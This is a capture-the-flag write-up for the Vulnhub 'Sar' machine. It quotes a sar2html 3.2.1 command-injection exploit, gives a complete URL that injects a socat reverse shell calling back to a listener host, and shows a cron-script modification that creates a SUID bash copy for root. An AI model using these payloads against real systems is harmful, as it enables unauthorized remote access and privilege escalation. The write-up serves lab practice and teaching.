## **Summary**

Sar2Html was vulnerable to a remote code execution which allowed us to gain access to the machine. To escalate our privileges we took advantage
of cronjob that executed a script we can modify.

> Machine can be found in [Vulnhub](https://www.vulnhub.com/entry/sar-1,425/)

## **Foothold**

Looked for an exploit online and found this one at [exploitdb](https://www.exploit-db.com/exploits/47204)

```
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen.
```

Tested the exploit:

Used socat reverse shell found at [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#socat)

Sat up a listener

```
socat file:`tty`,raw,echo=0 TCP-L:444
```

Browsed to `http://192.168.1.104/sar2HTML/index.php?plot=;socat%20exec:%27bash%20-li%27,pty,stderr,setsid,sigint,sane%20tcp:192.168.1.100:4444
` and got a reverse shell as `www-data`.

## **PrivEsc**

Examined the content of `/etc/crontab` and found a job running every 5 minutes to execute `/var/www/html/finally.sh`.

![](/assets/sar/crontab.png)

Examined `finally.sh` and found that it executes `write.sh` which we can modify.

![](/assets/sar/write-is-writable.png)

Backed up `write.sh` as `write.sh.orig`

Modified `write.sh` with the following:

```
#!/bin/sh

cp /bin/bash /bin/mybash
chmod u+s /bin/mybash
```

![](/assets/sar/write-modify.png)

Waited for 5 minutes, and `mybash` was created with the SUID bit set.

Ran `mybash -p` and got a root shell
